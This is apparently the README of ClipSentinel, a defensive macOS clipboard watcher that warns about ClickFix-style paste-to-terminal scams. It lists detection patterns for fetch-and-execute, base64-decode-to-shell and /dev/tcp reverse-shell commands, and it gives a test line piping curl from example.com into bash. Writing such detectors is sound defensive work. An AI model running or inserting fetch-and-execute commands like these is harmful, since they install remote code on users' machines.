# ClipSentinel

A tiny macOS clipboard watchdog for the **ClickFix Defense Kit**. It detects
dangerous shell commands the moment they are **copied** — the earliest point in
a ClickFix attack — and warns you *before* you paste them into a terminal.

## Why a clipboard watcher

ClickFix / FakeCAPTCHA scams work like this: a malicious page (often surfaced by
poisoned search/AI results) shows a fake "verify you are human" prompt. It
silently copies a shell command to your clipboard and tells you to open Terminal
and paste it "to finish verification." The dangerous moment is the **paste**.

The clipboard is therefore the *earliest* interception point — earlier than the
shell, and it works no matter which terminal you eventually paste into.
ClipSentinel fires a macOS notification the instant a dangerous command lands on
your clipboard.

## Honest limitations (read this)

- **ClipSentinel cannot block a paste.** macOS exposes no API to prevent a
  paste. This is an **advisory early-warning siren only**. The authoritative
  blocking control is **ShellGuard** (the zsh `accept-line` guard in this kit),
  which refuses to *execute* the command. Use both: ClipSentinel warns at copy
  time, ShellGuard blocks at execute time.
- It only sees the **plain-text** clipboard. Rich/concealed types are not its
  job.
- A determined user who ignores the banner and pastes anyway is not protected by
  this layer — that is what ShellGuard is for.

## What it detects

The same "download/decode-and-execute" grammar ShellGuard uses (kept in lockstep
so the two layers agree):

- `curl|wget|fetch ... | sh|bash|zsh|python|perl|ruby|node` (download piped to an interpreter)
- `eval $(curl ...)` / `exec $(wget ...)` (eval/exec of a command substitution)
- `base64 -d ... | sh` (decode piped to an interpreter)
- `echo <long-base64-blob> | base64 ...`
- bash `/dev/tcp/` or `/dev/udp/` reverse-shell redirects
- `osascript ... | sh`

It deliberately does **not** alert on a bare `curl` — only on the pipe-to-
interpreter / eval / decode kill chain. Alerting on plain `curl` would just train
you to ignore the warning.

### Allowlist (avoiding false positives)

Canonical install one-liners from trusted hosts (rustup, Homebrew, oh-my-zsh,
nvm, Docker, Deno, Bun) are suppressed so the guard doesn't cry wolf on
legitimate `curl … | sh` installers. Edit `ALLOWLIST_HOSTS` in
`clipsentinel.sh` to tune. Keep it short and host-based.

## How it works (implementation)

Pure shell, **no external dependencies** — only `pbpaste`, `shasum`/`md5`, and
`osascript`, all shipped with macOS.

1. Poll `pbpaste` once per second (configurable).
2. Hash the clipboard text; only inspect when the hash **changes** (so most loop
   iterations do nothing but compare a hash — CPU cost is negligible).
3. On a new copy that matches the dangerous grammar (and is not allowlisted),
   raise a macOS notification with the alarming **Basso** sound, plus an
   optional modal dialog.

The untrusted clipboard text is passed to `osascript` as an **argv parameter**,
not interpolated into the AppleScript source, so crafted clipboard content can't
inject AppleScript. Only a short, truncated preview is ever shown, and contents
are never stored or sent anywhere.

### Why polling (and the NSPasteboard alternative)

Polling `pbpaste` + a content hash is simple, dependency-free, and effective.
Clipboard changes are human-paced, so a 1s interval is plenty and costs
effectively nothing.

A lower-level alternative is a tiny Swift binary that watches
`NSPasteboard.general.changeCount` (a monotonic counter that bumps on every
clipboard write) and reads the content **only** when `changeCount` changes. That
is the same change-gated discipline this script implements in shell, and it
avoids reading the pasteboard on a blind timer (which on macOS 15.4+ is exactly
the background-scraping behavior Apple flags). If you want that approach, gate
the read behind a `changeCount` delta and skip `org.nspasteboard.ConcealedType`
/ `org.nspasteboard.TransientType` items. For most users the shell poller here
is the right 70%-effort / full-effect choice.

## Install

```sh
cd clickfix-defense-kit/clipsentinel   # from wherever you cloned the repo
chmod +x install.sh clipsentinel.sh
./install.sh            # install + start, and run at every login
```

Test it by copying a payload-shaped string, e.g.:

```
curl http://example.com/x | bash
```

You should immediately get a **"dangerous shell command copied"** banner. A
benign string (or an allowlisted installer like `curl https://sh.rustup.rs | sh`)
produces nothing.

### Commands

| Command | Effect |
|---|---|
| `./install.sh` or `./install.sh install` | Render the plist, load the LaunchAgent, start now + at login |
| `./install.sh uninstall` | Stop and remove the LaunchAgent |
| `./install.sh status` | Show whether it is loaded / running |
| `./install.sh run` | Run `clipsentinel.sh` in the foreground (test mode, no launchd) |

### Configuration (environment variables)

Set these in the `EnvironmentVariables` block of the plist, or export them when
running in the foreground:

| Variable | Default | Meaning |
|---|---|---|
| `CLIPSENTINEL_INTERVAL` | `1` | Poll interval in seconds |
| `CLIPSENTINEL_DIALOG` | `0` | `1` to also raise a blocking modal dialog |
| `CLIPSENTINEL_LOG` | *(none)* | Path to an append-only event log (previews only, never full payloads) |
| `CLIPSENTINEL_DISABLE` | `0` | `1` makes the watcher exit immediately (kill switch) |

## Files

| File | Purpose |
|---|---|
| `clipsentinel.sh` | The watcher: poll → hash-diff → pattern-match → notify |
| `com.clickfixkit.clipsentinel.plist` | LaunchAgent template (run at login, keep alive) |
| `install.sh` | Load / unload / status / foreground-run helper |
| `README.md` | This file |

## Defensive use only

ClipSentinel exists to warn humans about download-and-execute scams. It does not
run, store, exfiltrate, or modify clipboard contents — it inspects the plain
text locally and raises a local notification, nothing more.
